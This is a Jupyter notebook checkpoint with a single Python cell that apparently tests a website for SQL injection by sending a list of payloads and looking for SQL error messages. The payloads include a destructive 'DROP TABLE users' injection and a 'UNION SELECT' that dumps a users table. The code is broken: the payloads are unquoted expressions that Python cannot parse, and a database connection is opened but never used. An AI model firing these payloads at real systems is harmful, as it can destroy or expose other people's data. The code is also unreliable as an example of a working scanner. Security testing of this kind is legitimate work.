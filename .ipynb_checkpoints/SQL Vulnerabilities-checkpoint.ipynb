{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5bf5a7cf",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Import the necessary libraries\n",
    "import sqlite3\n",
    "import requests\n",
    "\n",
    "# Set the URL of the website you want to test\n",
    "url = \"http://www.example.com\"\n",
    "\n",
    "# Set the name of the database file\n",
    "db_file = \"database.db\"\n",
    "\n",
    "# Connect to the database\n",
    "conn = sqlite3.connect(db_file)\n",
    "\n",
    "# Define a function to test for SQL injection vulnerabilities\n",
    "def test_sql_injection(url, payload):\n",
    "  # Make a request to the website with the payload\n",
    "  r = requests.get(url, params=payload)\n",
    "  \n",
    "  # Check if the response contains a SQL error message\n",
    "  if \"SQL syntax\" in r.text or \"syntax error\" in r.text:\n",
    "    print(\"Vulnerable to SQL injection:\", payload)\n",
    "  else:\n",
    "    print(\"Not vulnerable:\", payload)\n",
    "\n",
    "# Test for SQL injection using common payloads\n",
    "payloads = [\n",
    "  {\"id\": 1},\n",
    "  {\"id\": 1 OR 1=1},\n",
    "  {\"id\": 1; DROP TABLE users},\n",
    "  {\"id\": 1 UNION SELECT * FROM users},\n",
    "]\n",
    "\n",
    "for payload in payloads:\n",
    "  test_sql_injection(url, payload)\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.12"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
